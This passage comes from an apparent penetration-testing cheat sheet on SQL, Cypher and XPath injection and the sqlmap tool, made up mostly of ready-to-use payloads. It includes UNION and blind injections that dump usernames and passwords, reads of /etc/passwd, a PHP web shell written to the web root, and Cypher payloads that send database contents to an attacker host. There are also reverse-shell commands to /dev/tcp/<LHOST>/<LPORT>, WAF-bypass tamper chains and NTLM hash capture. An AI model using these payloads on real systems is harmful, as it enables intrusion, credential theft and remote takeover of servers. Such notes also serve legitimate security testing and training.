0 UNION SELECT 1,2,group_concat(username,':',password SEPARATOR '<br>') FROM <TABLE>
```

### Manual Blind Authentication Bypass SQL Injection

> https://<RHOST>/article?id=3

```console
0 SELECT * FROM users WHERE username='%username%' AND password='%password%' LIMIT 1;
```

### Manual BooleanBased Blind SQL Injection

> https://<RHOST>/checkuser?username=admin

```console
admin123' UNION SELECT 1;--    # value is false
admin123' UNION SELECT 1,2;--    # value is false
admin123' UNION SELECT 1,2,3;--    # value changed to true
admin123' UNION SELECT 1,2,3 WHERE database() LIKE '%';--
admin123' UNION SELECT 1,2,3 WHERE database() LIKE 's%';--    # database name starts with "s"
admin123' UNION SELECT 1,2,3 FROM information_schema.tables WHERE table_schema = '<DATABASE>' AND table_name='users';--    # enumerating tables
admin123' UNION SELECT 1,2,3 FROM information_schema.COLUMNS WHERE table_schema='<DATABASE>' AND table_name='users' AND column_name LIKE 'a%';    # enumerating columns
admin123' UNION SELECT 1,2,3 FROM users WHERE username LIKE 'a%    # query for a username which starts with "a"
admin123' UNION SELECT 1,2,3 FROM users WHERE username LIKE 'ad%
admin123' UNION SELECT 1,2,3 FROM users WHERE username LIKE 'adm%
admin123' UNION SELECT 1,2,3 FROM users WHERE username LIKE 'admi%
admin123' UNION SELECT 1,2,3 FROM users WHERE username LIKE 'admin%
admin123' UNION SELECT SLEEP(5),2 FROM users WHERE username='admin' AND password LIKE '1%';--
admin123' UNION SELECT SLEEP(5),2 FROM users WHERE username='admin' AND password LIKE '12%';--
admin123' UNION SELECT SLEEP(5),2 FROM users WHERE username='admin' AND password LIKE '123%';--
admin123' UNION SELECT SLEEP(5),2 FROM users WHERE username='admin' AND password LIKE '1234%';--
```

### Manual Time-Based Blind SQL Injection

> https://<RHOST>/analytics?referrer=<RHOST>

```console
admin123' UNION SELECT SLEEP(5);--
admin123' UNION SELECT SLEEP(5),2;--    # the query created a 5 second delay which indicates that it was successful
admin123' UNION SELECT SLEEP(5),2 WHERE database() LIKE 'u%';--
admin123' UNION SELECT SLEEP(5),2 WHERE table_schema='users' and column_name LIKE 'a%';--
admin123' UNION SELECT SLEEP(5),2 WHERE table_schema='users' and column_name LIKE 'ad%';--
admin123' UNION SELECT SLEEP(5),2 WHERE table_schema='users' and column_name LIKE 'adm%';--
admin123' UNION SELECT SLEEP(5),2 WHERE table_schema='users' and column_name LIKE 'admi%';--
admin123' UNION SELECT SLEEP(5),2 WHERE table_schema='users' and column_name LIKE 'admin%';--
admin123' UNION SELECT SLEEP(5),2 FROM users WHERE username='admin' AND password LIKE 'a%';--
```

### SQL Command Injection

```console
$ ls -l&host=/var/www
$ command=bash+-c+'bash+-i+>%26+/dev/tcp/<LHOST>/<LPORT>+0>%261'%26host=
```

### SQL Truncation Attack

> https://blog.lucideus.com/2018/03/sql-truncation-attack-2018-lucideus.html

```console
'admin@<FQDN>' = 'admin@<FQDN>++++++++++++++++++++++++++++++++++++++htb' (URL encoded instead of spaces)
```

### SQL UNION Injection

```console
foobar" UNION SELECT NULL, NULL, @@hostname, @@version; #
foobar" UNION SELECT NULL, NULL, NULL, SCHEMA_NAME FROM information_schema.SCHEMATA; #
foobar" UNION SELECT 1, user, password, authentication_string FROM mysql.user; #
```

### List Tables

```console
UNION SELECT 1,table_name,3,4 FROM information_schema.tables;
```

### List Columns

```console
UNION SELECT 1,column_name,3,4 FROM information_schema.columns;
```

### Username and Password Fields

```console
UNION SELECT 1,concat(login,':',password),3,4 FROM users;
```

### Example of UNION Injection with enumerating information_schema

```console
SELECT group_concat(table_name,":",column_name,"\n") FROM information_schema.columns where table_schema = 'employees'
```

### URL Encoded SQL Injection

```console
http://<RHOST>/database.php?id=1%20UNION%20SELECT%201,concat%28table_name,%27:%27,%20column_name%29%20FROM%20information_schema.columns
```

### File Read

```console
uname=foo' UNION ALL SELECT NULL,LOAD_FILE('/etc/passwd'),NULL,NULL,NULL,NULL; -- &password=bar
```

### Dump to File

```console
SELECT ## FROM <TABLE> INTO dumpfile '/PATH/TO/FILE'
```

### Dump PHP Shell

```console
SELECT 'system($_GET[\'c\']); ?>' INTO OUTFILE '/var/www/shell.php'
```

### Read File Obfuscation

```console
SELECT LOAD_FILE(0x633A5C626F6F742E696E69)    // reads C:\boot.ini
```

### Cipher Injection

#### Check Server Version

```console
' OR 1=1 WITH 1 as a CALL dbms.components() YIELD name, versions, edition UNWIND versions
as version LOAD CSV FROM 'http://<LHOST>/?version=' + version + '&name=' + name + '&edition=' + edition as
l RETURN 0 as _0 //
```

#### Get Label

```console
' OR 1=1 WITH 1 as a CALL db.labels() yield label LOAD CSV FROM 'http://<LHOST>/?label='+label as
l RETURN 0 as _0 //
```

#### Get Key Properties

```console
' OR 1=1 WITH 1 as a MATCH (f:user) UNWIND keys(f) as p LOAD CSV FROM 'http://<LHOST>/?' + p
+'='+toString(f[p]) as l RETURN 0 as _0 //
```



## sqlite3

```console
$ sqlite3 <FILE>.db
```

### Common Commands

```console
sqlite> .tables
sqlite> PRAGMA table_info(<TABLE>);
sqlite> SELECT * FROM <TABLE>;
```

### Table Example

```console
$ sqlite3 <DATABASE>.db ".tables"
$ sqlite3 <DATABASE>.db ".schema <TABLE>"
$ sqlite3 <DATABASE>.db "SELECT * FROM <TABLE>;"
```

## sqlmap

> https://github.com/sqlmapproject/sqlmap

```console
--batch         // don't ask any questions
--current-db    // dumps database
```

```console
$ sqlmap --list-tampers
$ sqlmap -r <FILE>.req --level 5 --risk 3 --threads 10
$ sqlmap -r <FILE>.req --level 5 --risk 3 --tables
$ sqlmap -r <FILE>.req --level 5 --risk 3 --tables -D <DATABASE> --dump
$ sqlmap -r <FILE>.req --level 5 --risk 3 --tables users --dump --threads 10
$ sqlmap -r <FILE>.req -p <ID>
$ sqlmap -r <FILE>.req -p <ID> --dump
$ sqlmap -r <FILE>.req -p <ID> --passwords
$ sqlmap -r <FILE>.req -p <ID> --read-file+/etc/passwd
$ sqlmap -r <FILE>.req -p <ID> --os-cmd=whoami
$ sqlmap -r <FILE>.req  --dbs -D <DATABASE> -T <TABLE> --force-ssl --dump
$ sqlmap -r <FILE>.req  --dbs -D <DATABASE> -T <TABLE> -C id,is_staff,username,password --where "is_staff=1" --force-pivoting -pivot-column id --force-ssl --dump
```

### Web Application Firewall (WAF) Bypass

```console
$ sqlmap -u 'http://<RHOST>/search.cmd?form_state=1' --level=5 --risk=3 tamper=apostrophemask,apostrophenullencode,base64encode,between,chardoubleencode,charencode,charunicodeencode,equaltolike,greatest,ifnull2ifisnull,multiplespaces,nonrecursivereplacement,percentage,randomcase,securesphere,space2comment,space2plus,space2randomblank,unionalltounion,unmagicquotes --no-cast --no-escape --dbs --random-agent
```

### Using Cookies

```console
$ sqlmap -u 'http://<RHOST>/dashboard.php?search=a' --cookie="PHPSESSID=c35v0sipg7q8cnpiqpeqj42hhq"
```

### Using Flask Token

```console
$ sqlmap http://<RHOST>/ --eval="FROM flask_unsign import session as s; session = s.sign({'uuid': session}, secret='<SECRET_KEY>')" --cookie="session=*" --delay 1 --dump
```

### Using Web Sockets

```console
$ sqlmap --url "ws://<DOMAIN>" --data='{"params":"help","token":"<TOKEN>"}'
```

#### Fix Websocket Errors (sqlmap requires third-party module 'websocket-client' in order to use WebSocket functionality)

> https://stackoverflow.com/questions/40212252/python-websockets-module-has-no-attribute/40212593#40212593

> https://pypi.org/project/websocket-client-py3/

Try to install potentially missing modules first.

```console
$ pip install websocket-client
$ pip install websocket-client
$ pip install websocket-client-py3
$ pip install websocket-client-py3
$ pip install sqlmap-websocket-proxy
$ pip install sqlmap-websocket-proxy
```

If this does not help, uninstall the modules manually
and re-install them afterwards.

```console
$ pip install websocket-client
$ pip install websocket-client
$ pip uninstall websocket-client-py3
$ pip3 uninstall websocket-client-py3
```

#### sqlmap Web Socket Proxy Python Script

> https://rayhan0x01.github.io/ctf/2021/04/02/blind-sqli-over-websocket-automation.html

```console
from http.server import SimpleHTTPRequestHandler
from socketserver import TCPServer
from urllib.parse import unquote, urlparse
from websocket import create_connection

ws_server = "ws://localhost:8156/ws"

def send_ws(payload):
  ws = create_connection(ws_server)
  # If the server returns a response on connect, use below line 
  #resp = ws.recv() # If server returns something like a token on connect you can find and extract from here
  
  # For our case, format the payload in JSON
  message = unquote(payload).replace('"','\'') # replacing " with ' to avoid breaking JSON structure
  data = '{"employeeID":"%s"}' % message

  ws.send(data)
  resp = ws.recv()
  ws.close()

  if resp:
    return resp
  else:
    return ''

def middleware_server(host_port,content_type="text/plain"):

  class CustomHandler(SimpleHTTPRequestHandler):
    def do_GET(self) -> None:
      self.send_response(200)
      try:
        payload = urlparse(self.path).query.split('=',1)[1]
      except IndexError:
        payload = False
        
      if payload:
        content = send_ws(payload)
      else:
        content = 'No parameters specified!'

      self.send_header("Content-type", content_type)
      self.end_headers()
      self.wfile.write(content.encode())
      return

  class _TCPServer(TCPServer):
    allow_reuse_address = True

  httpd = _TCPServer(host_port, CustomHandler)
  httpd.serve_forever()


print("[+] Starting MiddleWare Server")
print("[+] Send payloads in http://localhost:8081/?id=*")

try:
  middleware_server(('0.0.0.0',8081))
except KeyboardInterrupt:
  pass
```

#### Execution

```console
$ sqlmap -u "http://localhost:8081/?id=1" --batch --dbs
```

### Getting Shell

```console
$ sqlmap -u 'http://<RHOST>/dashboard.php?search=a' --cookie="PHPSESSID=c35v0sipg7q8cnpiqpeqj42hhq" --os-shell
```

### Getting Reverse Shell

```console
$ os-shell> bash -c 'bash -i >& /dev/tcp/<LHOST>/<LPORT> 0>&1'
```

### Upgrade Shell

```console
$ postgres@<RHOST>:/home$ SHELL=/bin/bash script -q /dev/null
```

### File Read

```console
$ sqlmap -R <REQUEST> --level 5 --risk 3 --file-read=/etc/passwd --batch
```

### Search for Email

```console
$ sqlmap -r <REQUEST>.reg -p email --level 4 --risk 3 --batch
```

### Grabbing NTLMv2 Hashes with sqlmap and Responder

```console
$ sudo python3 Responder.py -I <INTERFACE>
$ sqlmap -r login.req --sql-query="exec master.dbo.xp_dirtree '\\\\<LHOST>\\share'"
```

## sqlmap Websocket Proxy

> https://github.com/BKreisel/sqlmap-websocket-proxy

```console
$ sqlmap-websocket-proxy -u 'ws://ws.<RHOST>:5789/version' -p '{"version": "2\u0022 %param%"}' --json
```

```console
$ sqlmap -u 'http://localhost:8080/?param1=1'
```

## sqsh

```console
$ sqsh -S <RHOST> -U <USERNAME>
$ sqsh -S '<RHOST>' -U '<USERNAME>' -P '<PASSWORD>'
$ sqsh -S '<RHOST>' -U '.\<USERNAME>' -P '<PASSWORD>'
```

### List Files and Folders with xp_dirtree

```console
1> EXEC master.sys.xp_dirtree N'C:\inetpub\wwwroot\',1,1;
```

## XPATH Injection

```console
test' or 1=1 or 'a'='a
test' or 1=2 or 'a'='a
'or substring(Password,1,1)='p' or'    // checking letter "p" on the beginning of the password
'or substring(Password,2,1)='p' or'    // checking letter "p" on the second position of the password
```
